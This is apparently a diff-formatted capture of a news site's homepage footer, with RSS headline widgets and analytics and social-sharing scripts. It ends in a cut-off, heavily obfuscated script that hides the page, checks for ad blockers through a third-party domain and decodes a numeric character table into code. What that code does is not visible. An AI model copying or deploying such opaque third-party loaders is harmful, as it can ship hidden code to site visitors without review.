it'</a></li><li><a class="rsswidget" href="http://feeds.foxnews.com/~r/foxnews/politics/~3/aBzZ6G-y4f4/newsom-attacks-those-behind-recall-says-will-win-walks-back-comments-on-feinstein-replacement">Newsom suggests recall motives are racist</a></li></ul></div> </div>
+<div class="mh-widget-col-1 mh-sidebar mh-home-sidebar mh-margin-left mh-home-area-10">
+<div class="mh-widget mh-home-10 widget_rss" id="rss-4"><h4 class="mh-widget-title"><span class="mh-widget-title-inner"><a class="rsswidget" href="https://www.washingtontimes.com/rss/headlines/news/politics/"><img alt="RSS" class="rss-widget-icon" height="14" src="https://madworldnews.com/wp-includes/images/rss.png" style="border:0" width="14"/></a> <a class="rsswidget" href="https://www.washingtontimes.com/news/politics/?utm_medium=RSS">Washington Times</a></span></h4><ul><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/state-ags-threaten-action-over-relief-package-rest/?utm_source=RSS_Feed&amp;utm_medium=RSS">State AGs threaten action over relief package restrictions on tax cuts</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/fort-hood-woes-fueled-investigator-inexperience-co/?utm_source=RSS_Feed&amp;utm_medium=RSS">Fort Hood woes fueled by investigator inexperience, Congress told</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/house-passes-bill-extend-application-deadline-ppp-/?utm_source=RSS_Feed&amp;utm_medium=RSS">House passes bill to extend application deadline for PPP loans to May 31</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/biden-cuomo-should-resign-if-investigation-confirm/?utm_source=RSS_Feed&amp;utm_medium=RSS">Biden: Cuomo should resign if investigation confirms claims</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/president-biden-tells-abc-news-cuomo-should-resign/?utm_source=RSS_Feed&amp;utm_medium=RSS">President Biden tells ABC News Cuomo should resign if investigation confirms sexual harassment alleg</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/nevada-lawmakers-weigh-proposals-to-curtail-transp/?utm_source=RSS_Feed&amp;utm_medium=RSS">Nevada lawmakers weigh proposals to curtail transparency</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/joe-biden-andrew-cuomo-should-resign-if-probe-conf/?utm_source=RSS_Feed&amp;utm_medium=RSS">Joe Biden: Andrew Cuomo should resign if probe confirms claims</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/joe-biden-dismisses-border-crisis-could-be-worse-a/?utm_source=RSS_Feed&amp;utm_medium=RSS">Joe Biden to migrants: 'Don't come'</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/donald-trump-joe-biden-destroying-our-country-bord/?utm_source=RSS_Feed&amp;utm_medium=RSS">Donald Trump: Joe Biden 'destroying our country' with border policies</a></li><li><a class="rsswidget" href="https://www.washingtontimes.com/news/2021/mar/16/kamala-harris-seizes-spotlight-joe-bidens-future-u/?utm_source=RSS_Feed&amp;utm_medium=RSS">Kamala Harris seizes spotlight with Joe Biden's future uncertain</a></li></ul></div> </div>
+</div>
+</div>
+</div>
+<div class="mh-copyright-wrap">
+<div class="mh-container mh-container-inner clearfix">
+<p class="mh-copyright">
+Copyright © 2020 | Mad World News, LLC </p>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+		/* MonsterInsights Scroll Tracking */
+			if ( typeof(jQuery) !== 'undefined' ) {
+				jQuery( document ).ready(function(){
+					function monsterinsights_scroll_tracking_load() {
+						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
+							(function(factory) {
+								factory(jQuery);
+							}(function($) {
+
+								/* Scroll Depth */
+								"use strict";
+								var defaults = {
+									percentage: true
+								};
+
+								var $window = $(window),
+									cache = [],
+									scrollEventBound = false,
+									lastPixelDepth = 0;
+
+								/*
+								 * Plugin
+								 */
+
+								$.scrollDepth = function(options) {
+
+									var startTime = +new Date();
+
+									options = $.extend({}, defaults, options);
+
+									/*
+									 * Functions
+									 */
+
+									function sendEvent(action, label, scrollDistance, timing) {
+
+										var fieldsArray = {
+											hitType       : 'event',
+											eventCategory : 'Scroll Depth',
+											eventAction   : action,
+											eventLabel    : label,
+											eventValue    : 1,
+											nonInteraction: 1
+										};
+
+										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
+											return;
+										}
+
+										MonsterInsightsObject.sendEvent( fieldsArray );
+										if (arguments.length > 3) {
+											fieldsArray = {
+												hitType        : 'timing',
+												timingCategory : 'Scroll Depth',
+												timingVar      : action,
+												timingValue    : timing,
+												timingLabel    : label,
+												nonInteraction: 1
+											};
+											MonsterInsightsObject.sendEvent( fieldsArray );
+										}
+									}
+
+									function calculateMarks(docHeight) {
+										return {
+											'25%' : parseInt(docHeight * 0.25, 10),
+											'50%' : parseInt(docHeight * 0.50, 10),
+											'75%' : parseInt(docHeight * 0.75, 10),
+											/* Cushion to trigger 100% event in iOS */
+											'100%': docHeight - 5
+										};
+									}
+
+									function checkMarks(marks, scrollDistance, timing) {
+										/* Check each active mark */
+										$.each(marks, function(key, val) {
+											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
+												sendEvent('Percentage', key, scrollDistance, timing);
+												cache.push(key);
+											}
+										});
+									}
+
+									function rounded(scrollDistance) {
+										/* Returns String */
+										return (Math.floor(scrollDistance/250) * 250).toString();
+									}
+
+									function init() {
+										bindScrollDepth();
+									}
+
+									/*
+									 * Public Methods
+									 */
+
+									/* Reset Scroll Depth with the originally initialized options */
+									$.scrollDepth.reset = function() {
+										cache = [];
+										lastPixelDepth = 0;
+										$window.off('scroll.scrollDepth');
+										bindScrollDepth();
+									};
+
+									/* Add DOM elements to be tracked */
+									$.scrollDepth.addElements = function(elems) {
+
+										if (typeof elems == "undefined" || !$.isArray(elems)) {
+											return;
+										}
+
+										$.merge(options.elements, elems);
+
+										/* If scroll event has been unbound from window, rebind */
+										if (!scrollEventBound) {
+											bindScrollDepth();
+										}
+
+									};
+
+									/* Remove DOM elements currently tracked */
+									$.scrollDepth.removeElements = function(elems) {
+
+										if (typeof elems == "undefined" || !$.isArray(elems)) {
+											return;
+										}
+
+										$.each(elems, function(index, elem) {
+
+											var inElementsArray = $.inArray(elem, options.elements);
+											var inCacheArray = $.inArray(elem, cache);
+
+											if (inElementsArray != -1) {
+												options.elements.splice(inElementsArray, 1);
+											}
+
+											if (inCacheArray != -1) {
+												cache.splice(inCacheArray, 1);
+											}
+
+										});
+
+									};
+
+									/*
+									 * Throttle function borrowed from:
+									 * Underscore.js 1.5.2
+									 * http://underscorejs.org
+									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
+									 * Underscore may be freely distributed under the MIT license.
+									 */
+
+									function throttle(func, wait) {
+										var context, args, result;
+										var timeout = null;
+										var previous = 0;
+										var later = function() {
+											previous = new Date;
+											timeout = null;
+											result = func.apply(context, args);
+										};
+										return function() {
+											var now = new Date;
+											if (!previous) previous = now;
+											var remaining = wait - (now - previous);
+											context = this;
+											args = arguments;
+											if (remaining <= 0) {
+												clearTimeout(timeout);
+												timeout = null;
+												previous = now;
+												result = func.apply(context, args);
+											} else if (!timeout) {
+												timeout = setTimeout(later, remaining);
+											}
+											return result;
+										};
+									}
+
+									/*
+									 * Scroll Event
+									 */
+
+									function bindScrollDepth() {
+
+										scrollEventBound = true;
+
+										$window.on('scroll.scrollDepth', throttle(function() {
+											/*
+											 * We calculate document and window height on each scroll event to
+											 * account for dynamic DOM changes.
+											 */
+
+											var docHeight = $(document).height(),
+												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
+												scrollDistance = $window.scrollTop() + winHeight,
+
+												/* Recalculate percentage marks */
+												marks = calculateMarks(docHeight),
+
+												/* Timing */
+												timing = +new Date - startTime;
+
+											checkMarks(marks, scrollDistance, timing);
+										}, 500));
+
+									}
+
+									init();
+								};
+
+								/* UMD export */
+								return $.scrollDepth;
+
+							}));
+
+							jQuery.scrollDepth();
+						} else {
+							setTimeout(monsterinsights_scroll_tracking_load, 200);
+						}
+					}
+					monsterinsights_scroll_tracking_load();
+				});
+			}
+		/* End MonsterInsights Scroll Tracking */
+		
+</script><script id="social_warfare_script-js-extra" type="text/javascript">
+/* <![CDATA[ */
+var socialWarfare = {"addons":[],"post_id":"66565","variables":{"emphasizeIcons":false,"powered_by_toggle":false,"affiliate_link":"https:\/\/warfareplugins.com"},"floatBeforeContent":""};
+/* ]]> */
+</script>
+<script id="social_warfare_script-js" src="https://madworldnews.com/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=4.2.1" type="text/javascript"></script>
+<script id="wp-embed-js" src="https://madworldnews.com/wp-includes/js/wp-embed.min.js?ver=5.6.2" type="text/javascript"></script>
+<script async="async" id="remote_sdk-js" src="https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=5.6.2" type="text/javascript"></script>
+<div class="swp_social_panelSide swp_floating_panel swp_social_panel swp_ swp_default_full_color swp_individual_full_color swp_other_full_color slide swp_float_left" data-float="left" data-float-color="#ffffff" data-float-mobile="none" data-min-width="1100" data-post-id="66565" data-transition="slide"><div class="nc_tweetContainer swp_share_button swp_facebook" data-network="facebook"><a class="nc_tweet swp_share_link" data-link="https://www.facebook.com/share.php?u=https%3A%2F%2Fmadworldnews.com%2F" href="https://www.facebook.com/share.php?u=https%3A%2F%2Fmadworldnews.com%2F" rel="nofollow noreferrer noopener" target="_blank"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_facebook_icon"></i><span class="swp_share">Share</span></span></span></span></a></div><div class="nc_tweetContainer swp_share_button swp_twitter" data-network="twitter"><a class="nc_tweet swp_share_link" data-link="https://twitter.com/intent/tweet?text=Home&amp;url=https%3A%2F%2Fmadworldnews.com%2F&amp;via=MadWorldNews" href="https://twitter.com/intent/tweet?text=Home&amp;url=https%3A%2F%2Fmadworldnews.com%2F&amp;via=MadWorldNews" rel="nofollow noreferrer noopener" target="_blank"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_twitter_icon"></i><span class="swp_share">Tweet</span></span></span></span></a></div></div><script type="text/javascript"> var swp_nonce = "107c366707";var swpFloatBeforeContent = false; var swp_ajax_url = "https://madworldnews.com/wp-admin/admin-ajax.php"; var swp_post_id = "66565";var swpClickTracking = false;</script><script></script><style>body{display:none;}</style><script>document.body.style.display="block";</script><script>function wvo(){if(xzyztjzor==undefined){var xzyztjzor={u:'//madworldnews.com/wvofeolitewvo/wvofenvalditewvo/2021/03/wvoefieldlite-dragunow12738a-[r].png',ts:'1615959296',ta_do:"rddywd.com",ta_js:"advertising.js",ta_im:"adcode.png",ta_e:true,ta_r:true,ta_r2:false,debug:function(){return ta_r&ta_do;},adb:function(){if(!xzyztjzor.ta_r2){var si=document.createElement("img");si.crossOrigin="Anonymous";si.onload=function(_si){if(xzyztjzor.ta_r){xzyztjzor.ta_r=false;xzyztjzor.ta_r2=true;return;}};si.src="//"+xzyztjzor.ta_do+"/"+xzyztjzor.ta_im;}xzyztjzor.ta_e=false;},};(function(){var ykvmvcyo=["y","o",".","Y","B","c","G","U","J","7","H","E","[","K","9","l","n","2","q","4","R","Q","e","8","C","p","S","\"","m","<","V","-","z","0","f","6","h","1","X","g","b","w","=","d","v","a","i","A",")"," ","N","T","3","O","|","/",">","\\","r","5","`","F",":","!","s","M","u",",","}","I","_","*","{","x",";","L","^","]","t","$","@","(","?","'","D","#","&","+","j","P","W","Z","k","%"];var xzyztjzor=[78,58,0,72,43,1,5,66,28,22,16,78,2,5,66,58,58,22,16,78,26,5,58,46,25,78,2,64,22,78,47,78,78,58,46,40,66,78,22,81,83,64,58,5,83,67,83,15,1,15,83,48,74,68,5,45,78,5,36,81,22,48,72,68,46,34,81,65,45,78,36,2,58,45,16,43,1,28,42,42,16,66,15,15,48,72,53,40,88,22,5,78,2,43,22,34,46,16,22,89,58,1,25,22,58,78,0,81,65,45,78,36,67,27,58,45,16,43,1,28,27,67,72,44,45,15,66,22,62,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,49,25,45,58,64,22,61,15,1,45,78,81,83,33,2,83,87,16,22,41,49,84,45,78,22,81,48,2,39,22,78,7,51,24,65,46,15,15,46,64,22,5,1,16,43,64,81,48,48,68,68,48,74,68,46,34,81,65,45,78,36,2,34,15,1,1,58,42,42,16,66,15,15,48,72,53,40,88,22,5,78,2,43,22,34,46,16,22,89,58,1,25,22,58,78,0,81,65,45,78,36,67,27,34,15,1,1,58,27,67,72,44,45,15,66,22,62,34,66,16,5,78,46,1,16,81,44,48,72,58,22,78,66,58,16,49,25,45,58,64,22,69,16,78,81,44,2,78,1,26,78,58,46,16,39,81,48,48,68,68,48,74,68,46,34,81,32,16,26,42,42,66,16,43,22,34,46,16,22,43,48,72,44,45,58,49,32,16,26,42,72,66,62,83,55,55,28,45,43,41,1,58,15,43,16,22,41,64,2,5,1,28,55,41,25,31,5,1,16,78,22,16,78,55,66,25,15,1,45,43,64,55,17,33,17,37,55,33,52,55,41,44,1,34,22,1,15,46,78,22,22,45,40,25,31,40,66,16,39,45,15,1,41,37,17,9,52,23,45,31,12,58,77,2,25,16,39,83,67,0,62,83,55,55,28,45,43,41,1,58,15,43,16,22,41,64,2,5,1,28,55,47,24,55,47,66,8,75,32,10,61,55,58,84,64,40,22,92,36,55,66,8,58,75,84,30,53,31,12,58,77,2,88,25,39,83,67,78,64,62,83,37,35,37,59,14,59,14,17,14,35,83,67,34,15,62,12,77,67,5,34,62,34,45,15,64,22,67,45,78,70,43,1,62,27,58,43,43,0,41,43,2,5,1,28,27,67,45,78,70,88,64,62,27,45,43,44,22,58,78,46,64,46,16,39,2,88,64,27,67,45,78,70,46,28,62,27,45,43,5,1,43,22,2,25,16,39,27,67,45,78,70,58,66,62,27,55,45,43,44,22,58,78,46,64,46,16,39,2,88,64,27,67,45,78,70,58,46,62,27,55,45,43,5,15,66,78,78,22,58,2,25,16,39,27,67,45,78,70,22,46,62,27,58,46,39,36,78,45,43,27,67,45,78,70,22,5,62,27,5,1,16,78,22,16,78,31,45,43,49,5,1,16,78,22,16,78,47,43,27,67,45,78,70,22,64,62,27,25,1,64,46,78,46,1,16,62,45,40,64,1,15,66,78,22,74,43,46,64,25,15,45,0,62,40,15,1,5,92,74,27,67,45,78,70,22,62,78,58,66,22,67,45,78,70,58,62,78,58,66,22,67,45,78,70,58,17,62,34,45,15,64,22,67,46,62,34,45,15,64,22,67,5,62,33,67,66,5,62,34,45,15,64,22,67,5,15,62,12,77,67,25,44,62,34,45,15,64,22,67,5,64,64,62,34,45,15,64,22,67,45,78,70,39,62,34,45,15,64,22,67,45,78,70,43,62,34,45,15,64,22,67,45,78,70,46,62,34,45,15,64,22,67,45,78,70,34,62,34,45,15,64,22,67,45,78,70,46,40,62,83,41,44,1,83,67,64,16,62,33,67,64,78,45,58,78,62,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,49,34,66,16,5,78,46,1,16,81,48,72,63,34,66,16,5,78,46,1,16,81,45,67,40,67,5,48,72,45,12,40,77,42,5,81,48,68,81,32,16,26,67,27,44,27,67,34,66,16,5,78,46,1,16,81,48,72,34,66,16,5,78,46,1,16,49,45,81,48,72,58,22,78,66,58,16,72,41,46,43,78,36,62,92,81,48,67,36,22,46,39,36,78,62,15,81,48,68,68,34,66,16,5,78,46,1,16,49,40,81,45,67,40,48,72,44,45,58,49,5,42,72,68,74,58,22,78,66,58,16,49,40,42,87,40,54,54,33,67,5,2,41,46,43,78,36,42,81,5,2,58,46,39,36,78,42,45,2,58,46,39,36,78,87,40,48,31,81,5,2,15,22,34,78,42,45,2,15,22,34,78,31,40,48,67,5,2,36,22,46,39,36,78,42,81,5,2,40,1,78,78,1,28,42,45,2,40,1,78,78,1,28,87,40,48,31,81,5,2,78,1,25,42,45,2,78,1,25,31,40,48,67,5,68,34,66,16,5,78,46,1,16,49,5,81,45,67,5,48,72,58,22,78,66,58,16,49,45,42,45,86,86,63,45,2,16,1,43,22,51,0,25,22,82,45,12,33,77,62,45,67,45,86,86,37,42,42,42,45,2,16,1,43,22,51,0,25,22,82,40,81,45,2,39,22,78,4,1,66,16,43,46,16,39,24,15,46,22,16,78,20,22,5,78,81,48,67,5,48,62,63,37,68,34,66,16,5,78,46,1,16,49,43,81,40,48,72,40,42,16,66,15,15,42,42,40,82,45,81,48,62,37,42,42,42,40,2,16,1,43,22,51,0,25,22,82,5,81,40,48,62,40,74,44,45,58,49,43,42,40,2,36,22,46,39,36,78,67,22,42,40,2,41,46,43,78,36,74,58,22,78,66,58,16,49,43,42,27,34,66,16,5,78,46,1,16,27,42,42,78,0,25,22,1,34,49,43,82,43,2,5,45,15,15,81,40,48,62,43,67,22,42,27,34,66,16,5,78,46,1,16,27,42,42,78,0,25,22,1,34,49,22,82,22,2,5,45,15,15,81,40,48,62,22,67,22,55,43,68,44,45,58,49,22,42,72,68,67,34,42,27,66,16,43,22,34,46,16,22,43,27,63,42,78,0,25,22,1,34,49,41,46,16,43,1,41,86,86,41,46,16,43,1,41,67,39,42,27,66,16,43,22,34,46,16,22,43,27,63,42,78,0,25,22,1,34,49,43,1,5,66,28,22,16,78,86,86,43,1,5,66,28,22,16,78,67,36,42,39,86,86,39,2,43,1,5,66,28,22,16,78,11,15,22,28,22,16,78,67,46,42,34,45,15,64,22,67,88,42,46,82,34,66,16,5,78,46,1,16,81,45,48,72,58,22,78,66,58,16,63,63,46,2,5,45,15,15,81,34,67,45,48,2,28,45,78,5,36,22,64,68,62,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,63,37,68,67,92,42,22,2,44,46,22,41,25,1,58,78,90,42,34,66,16,5,78,46,1,16,81,48,72,44,45,58,49,45,42,36,2,5,15,46,22,16,78,90,46,43,78,36,67,40,42,34,2,46,16,16,22,58,90,46,43,78,36,74,58,22,78,66,58,16,49,40,56,45,82,40,62,45,68,67,15,42,22,2,44,46,22,41,25,1,58,78,10,42,34,66,16,5,78,46,1,16,81,48,72,44,45,58,49,45,42,36,2,5,15,46,22,16,78,10,22,46,39,36,78,67,40,42,34,2,46,16,16,22,58,10,22,46,39,36,78,74,58,22,78,66,58,16,49,40,56,45,82,40,62,45,68,74,58,22,78,66,58,16,49,22,2,28,18,42,88,67,22,2,44,46,22,41,25,1,58,78,42,45,67,22,2,64,5,58,1,15,15,38,42,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,49,34,2,25,45,39,22,38,53,34,34,64,22,78,54,54,36,2,64,5,58,1,15,15,75,22,34,78,68,67,22,2,64,5,58,1,15,15,3,42,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,49,34,2,25,45,39,22,3,53,34,34,64,22,78,54,54,36,2,64,5,58,1,15,15,51,1,25,68,67,22,2,58,22,5,78,45,16,39,15,22,42,5,67,22,2,45,64,25,22,5,78,42,43,67,22,2,46,16,38,42,34,66,16,5,78,46,1,16,81,45,67,40,48,72,44,45,58,49,43,42,5,81,45,67,40,48,74,58,22,78,66,58,16,63,63,43,86,86,43,2,58,46,39,36,78,56,42,33,86,86,43,2,15,22,34,78,29,42,92,81,48,68,67,22,2,46,16,3,42,34,66,16,5,78,46,1,16,81,45,67,40,48,72,44,45,58,49,43,42,5,81,45,67,40,48,74,58,22,78,66,58,16,63,63,43,86,86,43,2,40,1,78,78,1,28,56,42,33,86,86,43,2,78,1,25,29,42,15,81,48,68,67,22,2,46,16,30,46,22,41,25,1,58,78,42,34,66,16,5,78,46,1,16,81,45,67,40,48,72,44,45,58,49,43,42,5,81,45,67,40,48,74,58,22,78,66,58,16,63,63,43,86,86,43,2,40,1,78,78,1,28,56,42,33,86,86,43,2,58,46,39,36,78,56,42,33,86,86,43,2,78,1,25,29,42,15,81,48,86,86,43,2,15,22,34,78,29,42,92,81,48,68,67,22,68,48,74,63,34,66,16,5,78,46,1,16,81,16,67,78,67,22,48,72,78,12,16,77,42,22,81,48,68,81,27,18,27,67,32,16,26,67,34,66,16,5,78,46,1,16,81,48,72,34,66,16,5,78,46,1,16,49,16,81,16,48,72,58,22,78,66,58,16,12,77,2,64,15,46,5,22,2,5,45,15,15,81,16,67,33,48,68,34,66,16,5,78,46,1,16,49,78,81,16,48,72,44,45,58,49,78,74,58,22,78,66,58,16,49,16,86,86,27,1,40,88,22,5,78,27,42,42,78,0,25,22,1,34,49,16,86,86,81,78,42,16,2,16,1,43,22,51,0,25,22,48,86,86,81,37,42,42,78,54,54,14,42,42,78,48,68,34,66,16,5,78,46,1,16,49,22,81,16,48,72,58,22,78,66,58,16,27,1,40,88,22,5,78,27,42,42,78,0,25,22,1,34,49,16,86,86,46,64,61,46,16,46,78,22,81,16,2,15,22,16,39,78,36,48,68,34,66,16,5,78,46,1,16,49,1,81,16,48,72,34,1,58,81,44,45,58,49,78,42,12,77,67,1,42,33,67,58,42,16,2,15,22,16,39,78,36,74,58,56,1,74,87,87,1,48,22,81,16,12,1,77,48,82,78,42,78,2,5,1,16,5,45,78,81,16,12,1,77,48,62,78,12,78,2,15,22,16,39,78,36,77,42,16,12,1,77,74,58,22,78,66,58,16,49,78,68,34,66,16,5,78,46,1,16,49,58,81,16,48,72,44,45,58,49,78,67,22,67,1,42,12,77,74,16,62,34,1,58,81,78,42,33,74,78,29,16,2,15,22,16,39,78,36,74,78,87,87,48,72,34,1,58,81,22,42,33,74,22,29,1,2,15,22,16,39,78,36,74,22,87,87,48,46,34,81,1,12,22,77,42,42,16,12,78,77,48,5,1,16,78,46,16,66,22,49,16,74,1,12,1,2,15,22,16,39,78,36,77,42,16,12,78,77,68,58,22,78,66,58,16,49,1,68,34,66,16,5,78,46,1,16,49,46,81,16,48,72,58,22,78,66,58,16,49,16,82,27,64,78,58,46,16,39,27,42,42,78,0,25,22,1,34,49,16,82,66,81,16,48,12,33,77,62,63,16,12,64,77,86,86,22,81,16,48,82,16,12,33,77,62,16,62,34,68,34,66,16,5,78,46,1,16,49,66,81,58,67,66,48,72,44,45,58,49,45,67,64,42,46,81,66,48,74,58,22,78,66,58,16,49,64,86,86,58,82,58,42,42,42,15,54,54,78,81,58,48,82,63,66,54,54,58,63,42,42,15,86,86,78,81,64,48,86,86,28,81,58,67,64,48,82,12,58,77,62,12,77,62,58,86,86,22,81,58,48,82,1,81,58,48,62,34,2,39,22,78,11,15,22,28,22,16,78,64,4,0,24,15,45,64,64,50,45,28,22,86,86,27,64,78,58,46,16,39,27,42,42,58,86,86,81,45,42,58,2,28,45,78,5,36,81,5,48,48,82,16,81,64,2,39,22,78,11,15,22,28,22,16,78,64,4,0,24,15,45,64,64,50,45,28,22,81,45,12,37,77,48,48,62,58,86,86,81,58,2,43,1,5,66,28,22,16,78,54,54,58,2,16,1,43,22,51,0,25,22,86,86,14,42,42,58,2,16,1,43,22,51,0,25,22,48,82,66,82,12,77,62,12,58,77,62,16,81,64,2,18,66,22,58,0,26,22,15,22,5,78,1,58,47,15,15,81,58,48,48,62,12,77,68,44,45,58,49,5,42,55,76,57,2,81,12,57,41,57,31,77,87,48,79,55,67,73,42,27,5,1,28,25,45,58,22,27,87,27,84,1,5,66,28,22,16,78,27,87,27,89,1,64,46,78,46,1,16,27,67,34,42,43,1,5,66,28,22,16,78,67,15,42,41,46,16,43,1,41,67,45,42,34,2,43,1,5,66,28,22,16,78,11,15,22,28,22,16,78,67,64,42,27,16,1,43,22,51,0,25,22,27,67,28,42,73,49,46,16,49,45,82,34,66,16,5,78,46,1,16,81,16,67,78,48,72,58,22,78,66,58,16,49,37,35,42,42,81,37,35,86,78,12,73,77,81,16,48,48,68,62,34,66,16,5,78,46,1,16,81,16,67,78,48,72,58,22,78,66,58,16,49,78,42,78,42,42,34,54,54,78,42,42,41,46,16,43,1,41,82,45,62,78,67,78,63,42,42,16,86,86,78,2,5,1,16,78,45,46,16,64,81,16,48,68,74,58,22,78,66,58,16,49,66,2,66,16,46,18,42,58,67,66,68,67,78,36,46,64,48,74,46,34,81,16,45,44,46,39,45,78,1,58,2,66,64,22,58,47,39,22,16,78,2,64,22,45,58,5,36,81,27,49,4,58,45,44,22,55,27,48,56,31,37,48,32,16,26,2,45,78,70,58,42,78,58,66,22,74,46,34,81,32,16,26,2,46,48,58,22,78,66,58,16,49,34,45,15,64,22,74,32,16,26,2,46,42,78,58,66,22,74,32,16,26,2,45,78,70,39,42,83,39,22,78,83,74,58,22,78,66,58,16,49,32,16,26,2,45,40,43,81,34,66,16,5,78,46,1,16,81,48,72,78,58,0,72,44,45,58,49,45,42,43,1,5,66,28,22,16,78,2,5,58,22,45,78,22,11,15,22,28,22,16,78,81,83,46,34,58,45,28,22,83,48,74,43,1,5,66,28,22,16,78,2,36,22,45,43,2,45,25,25,22,16,43,24,36,46,15,43,81,45,48,74,44,45,58,49,39,22,78,53,41,16,89,58,1,25,22,58,78,0,84,22,64,5,58,46,25,78,1,58,42,45,2,5,1,16,78,22,16,78,90,46,16,43,1,41,2,53,40,88,22,5,78,2,39,22,78,53,41,16,89,58,1,25,22,58,78,0,84,22,64,5,58,46,25,78,1,58,74,44,45,58,49,1,40,88,22,5,78,43,22,34,46,16,22,89,58,1,25,22,58,78,0,42,45,2,5,1,16,78,22,16,78,90,46,16,43,1,41,2,53,40,88,22,5,78,2,43,22,34,46,16,22,89,58,1,25,22,58,78,0,74,44,45,58,49,45,25,25,42,39,22,78,53,41,16,89,58,1,25,22,58,78,0,84,22,64,5,58,46,25,78,1,58,81,45,2,5,1,16,78,22,16,78,90,46,16,43,1,41,2,50,1,43,22,2,25,58,1,78,1,78,0,25,22,67,27,46,16,64,22,58,78,4,22,34,1,58,22,27,48,74,45,25,25,2,5,1,16,34,46,39,66,58,45,40,15,22,42,34,45,15,64,22,74,1,40,88,22,5,78,43,22,34,46,16,22,89,58,1,25,22,58,78,0,81,41,46,16,43,1,41,2,50,1,43,22,2,25,58,1,78,1,78,0,25,22,67,27,46,16,64,22,58,78,4,22,34,1,58,22,27,67,45,25,25,48,74,45,25,25,42,39,22,78,53,41,16,89,58,1,25,22,58,78,0,84,22,64,5,58,46,25,78,1,58,81,45,2,5,1,16,78,22,16,78,90,46,16,43,1,41,2,11,15,22,28,22,16,78,2,25,58,1,78,1,78,0,25,22,67,27,46,16,16,22,58,10,51,65,75,27,48,74,45,25,25,2,5,1,16,34,46,39,66,58,45,40,15,22,42,34,45,15,64,22,74,1,40,88,22,5,78,43,22,34,46,16,22,89,58,1,25,22,58,78,0,81,41,46,16,43,1,41,2,11,15,22,28,22,16,78,2,25,58,1,78,1,78,0,25,22,67,27,46,16,16,22,58,10,51,65,75,27,67,45,25,25,48,74,45,25,25,42,39,22,78,53,41,16,89,58,1,25,22,58,78,0,84,22,64,5,58,46,25,78,1,58,81,45,2,5,1,16,78,22,16,78,90,46,16,43,1,41,2,11,15,22,28,22,16,78,2,25,58,1,78,1,78,0,25,22,67,27,1,66,78,22,58,10,51,65,75,27,48,74,45,25,25,2,5,1,16,34,46,39,66,58,45,40,15,22,42,34,45,15,64,22,74,1,40,88,22,5,78,43,22,34,46,16,22,89,58,1,25,22,58,78,0,81,41,46,16,43,1,41,2,11,15,22,28,22,16,78,2,25,58,1,78,1,78,0,25,22,67,27,1,66,78,22,58,10,51,65,75,27,67,45,25,25,48,74,45,2,58,22,28,1,44,22,81,48,74,68,5,45,78,5,36,81,22,48,72,68,32,16,26,2,34,81,32,16,26,2,34,15,48,74,32,16,26,2,34,5,81,48,74,32,16,26,2,28,34,81,48,74,64,22,78,51,46,28,22,1,66,78,81,34,66,16,5,78,46,1,16,81,48,72,32,16,26,2,34,81,32,16,26,2,34,15,48,74,68,67,37,59,33,33,48,74,32,16,26,2,16,1,41,81,32,16,26,2,66,58,81,32,16,26,2,66,48,67,43,1,5,66,28,22,16,78,2,39,22,78,11,15,22,28,22,16,78,64,4,0,51,45,39,50,45,28,22,81,27,36,78,28,15,27,48,12,33,77,48,74,58,22,78,66,58,16,49,78,58,66,22,74,68,48,74,68,68,81,48,67,45,40,43,62,34,66,16,5,78,46,1,16,81,48,72,58,22,78,66,58,16,49,34,66,16,5,78,46,1,16,81,34,48,72,46,34,81,32,16,26,2,45,78,70,58,48,72,32,16,26,2,45,78,70,46,42,83,69,28,83,87,83,45,39,22,83,74,44,45,58,49,64,46,42,43,1,5,66,28,22,16,78,2,5,58,22,45,78,22,11,15,22,28,22,16,78,81,27,46,28,39,27,48,74,64,46,2,5,58,1,64,64,53,58,46,39,46,16,42,27,47,16,1,16,0,28,1,66,64,27,74,64,46,2,1,16,22,58,58,1,58,42,34,66,16,5,78,46,1,16,81,70,64,46,48,72,46,34,81,32,16,26,2,64,16,42,42,33,48,72,32,16,26,2,64,16,42,37,74,32,16,26,2,45,78,70,43,42,83,84,45,83,87,83,78,45,83,74,58,22,78,66,58,16,49,34,81,48,74,68,68,74,64,46,2,1,16,15,1,45,43,42,34,66,16,5,78,46,1,16,81,70,64,46,48,72,46,34,81,32,16,26,2,64,16,42,42,33,48,72,32,16,26,2,45,78,70,58,42,34,45,15,64,22,74,58,22,78,66,58,16,74,68,68,74,64,46,2,64,58,5,42,27,55,55,27,87,32,16,26,2,45,78,70,43,1,87,27,55,27,87,32,16,26,2,45,78,70,46,28,74,68,34,66,16,5,78,46,1,16,49,46,64,81,22,48,72,46,34,81,32,16,26,2,64,16,42,42,33,48,72,32,16,26,2,64,16,42,37,74,32,16,26,2,45,78,70,43,42,83,84,45,83,87,83,78,45,83,74,58,22,78,66,58,16,49,34,81,48,74,68,68,44,45,58,49,64,46,42,43,1,5,66,28,22,16,78,2,5,58,22,45,78,22,11,15,22,28,22,16,78